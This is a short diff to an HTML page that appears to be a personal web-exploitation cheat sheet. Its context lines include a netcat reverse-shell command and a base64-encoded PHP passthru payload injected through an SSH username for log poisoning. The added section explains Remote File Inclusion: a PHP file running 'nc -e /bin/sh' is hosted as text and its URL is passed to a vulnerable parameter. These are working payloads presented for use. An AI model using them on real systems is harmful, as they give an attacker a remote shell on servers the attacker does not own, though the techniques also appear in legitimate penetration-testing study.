@@ -187,7 +187,12 @@ nc -e /bin/sh 10.20.14 8080<br>
     <p>try to connect with ssh. where payload use on username.<br>
     this time payload would encrypted like <pre> "&lt;?passthru(base64_decode('encrypted code'));?&gt;"</pre>
     </ol>
-
+    
+    <h2><li>Remote File Inclusion (RFI) exploitation</li></h2>
+    <p>Remote file inclusion same as LFI. sent payload url as input. <br>
+    make php payload like ( <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre>) or any kind of command and save it as a txt file.<br>
+    Then give this file url as a payload with '?' at the end of the payload.
+    </p>
 </div>
    <!-- Exploitation section end here  -->
 </body>
